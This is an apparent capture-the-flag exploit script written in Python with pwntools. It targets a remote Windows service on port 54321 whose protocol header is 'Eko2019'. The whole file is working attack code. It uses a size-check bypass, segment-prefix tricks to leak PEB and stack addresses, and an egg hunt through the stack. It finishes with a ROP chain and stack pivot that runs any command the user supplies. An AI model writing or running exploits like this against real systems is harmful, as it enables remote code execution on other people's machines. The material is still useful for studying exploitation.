#!/usr/bin/python

from pwn import *
import sys

if len(sys.argv) < 2:
	print("usage: %s <remote_addr> [<command to execute>]" % sys.argv[0])
	sys.exit(-1)

context.log_level = 'warn'

REMOTE_ADDR = sys.argv[1]

CMD = "calc.exe"
if len(sys.argv) > 2:
	CMD = sys.argv[2]

if len(CMD) >= 0x40:
	print("Command too long (max 63 chars), defaulting to calc.exe")
	CMD = "calc.exe"

MAGIC_VALUE = u64("F4b<3Syn")

def connect_me():
	return remote(REMOTE_ADDR, 54321)

def gen_head():
	header  = "Eko2019\0"
	header += p64(0xffffffffffff0400) # Size to pass the 0x200 check (negative on 32-bits, 0x400 on 16-bits)
	return header

def gen_pkt(buff, offset, pointer):
	pkt = ""
	# Potential rop chain
	if buff is not None:
		pkt += buff
	# Padd
	while len(pkt) < (0x200 - 8 - 0x40):
		pkt += p64(0x4141414141414141)
	# Command string to execute
	pkt += CMD
	# Padd cmd with nulls
	while len(pkt) < (0x200 - 8):
		pkt += "\x00"
	# Magic for egg hunting
	pkt += p64(MAGIC_VALUE)
	# Overflow :)
	if offset is not None:
		pkt += chr(offset) * 8
		if pointer is not None:
			pkt += p64(pointer)
	return pkt

def gs_read(offset):
	GS_PREFIX = 0x65
	sh = connect_me()
	sh.send(gen_head())
	pkt = gen_pkt(None, GS_PREFIX, offset)
	sh.send(pkt)
	res = u64(sh.recv(8))
	sh.close()
	return res

def arb_read(address):
	DS_PREFIX = 0x3e
	sh = connect_me()
	sh.send(gen_head())
	pkt = gen_pkt(None, DS_PREFIX, address)
	sh.send(pkt)
	res = u64(sh.recv(8))
	sh.close()
	return res

def rop(address, chain):
	PUSH_RCX = 0x51
	sh = connect_me()
	sh.send(gen_head())
	pkt = gen_pkt(chain, PUSH_RCX, address)
	sh.send(pkt)
	sh.close()

StackBase = gs_read(0x8)
print("[+] StackBase: %x" % StackBase)

PEB = gs_read(0x60)
print("[+] PEB: %x" % PEB)

ImageBaseAddress = arb_read(PEB + 0x10)
print("[+] ImageBaseAddress: %x" % ImageBaseAddress)

# Egg hunting in the stack
# Slow, might be improved
StackOff = 0
StackLeak = 0
print("[*] Leaking stack (slow)...")
while StackLeak != 0x4141414141414141:
	StackLeak = arb_read(StackBase - StackOff)
	StackOff += 0x100
StackOff -= 8
while StackLeak != MAGIC_VALUE:
	StackLeak = arb_read(StackBase - StackOff)
	StackOff -= 8

magic_addr = (StackBase - StackOff - 8)
print("[+] Magic = 0x%x" % magic_addr)

fake_argv = magic_addr - 0x200 + 8
fake_argv0 = magic_addr - 0x40

stack_pivot = ImageBaseAddress + 0x1aea # 0x0000000140001aea : add rsp, 0x88 ; ret
ret = ImageBaseAddress + 0x100d # 0x000000014000100d : ret
main = ImageBaseAddress + 0x1419 # bypass arg copy on stack

rop_chain  = p64(ret) * 0xf # ret sled + realign stack (% 0x10)
rop_chain += p64(main)
rop_chain += p64(stack_pivot) # add rsp, 0x88 after main execution
rop_chain += p64(0) # fake argc
rop_chain += p64(fake_argv) # fake argv

# Set stack to point to handle_connection() return address
rop_chain += p64(ret) * (0x108/8)
rop_chain += p64(stack_pivot) 

rop(stack_pivot, p64(fake_argv0) + rop_chain)

print("[+] Executed: %s" % CMD)